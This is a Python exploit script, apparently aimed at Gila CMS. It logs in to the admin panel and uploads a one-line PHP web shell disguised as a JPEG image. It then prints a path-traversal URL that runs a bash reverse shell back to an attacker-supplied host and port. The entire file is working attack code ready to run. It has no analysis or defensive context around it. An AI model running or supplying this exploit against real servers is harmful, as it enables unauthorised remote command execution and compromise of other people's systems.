import requests
import sys
import urllib.parse
from requests_toolbelt.multipart.encoder import MultipartEncoder

def start(url, user, passwd, lhost, lport):
    cookie = ""
    login_url = url + "/admin/"
    login_data = {"username": user, "password": passwd}
    print(login_url)
    r = requests.post(login_url, data=login_data)
    if (r.status_code == 200) and ("Wrong" not in r.text) :
        print("[+] Login success")
        cookie = r.cookies
        get_shell(url, cookie, lhost, lport)
    else:
        print("[-] Login failed")
        sys.exit(1)


def get_shell(url, cookie, lhost, lport):
    upload_url = url + "/admin/media_upload"
    multi_data = MultipartEncoder(
        fields={
            "uploadfiles" : ('gila.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            "path" : "assets",
            "g_response" : "content",
        }
    )
    header = {'Content-Type' : multi_data.content_type}
    r = requests.post(upload_url, data=multi_data, headers=header, cookies=cookie)
    if r.status_code == 200:
        print("[+] Upload success")
        shell_url = url + "/cm/delete?t=../../assets/gila.jpg&cmd="
        cmd = "bash -c \'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1\'"
        payload = urllib.parse.quote_plus(cmd)
        print("[+] Start your listener and call this url: ") 
        print(shell_url + payload)


if __name__ == '__main__':
    if len(sys.argv) != 6:
        print("Usage: pwn_gila.py <http://url> <user> <pass> <lhost> <lport>")
        sys.exit(1)
    else:
        start(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])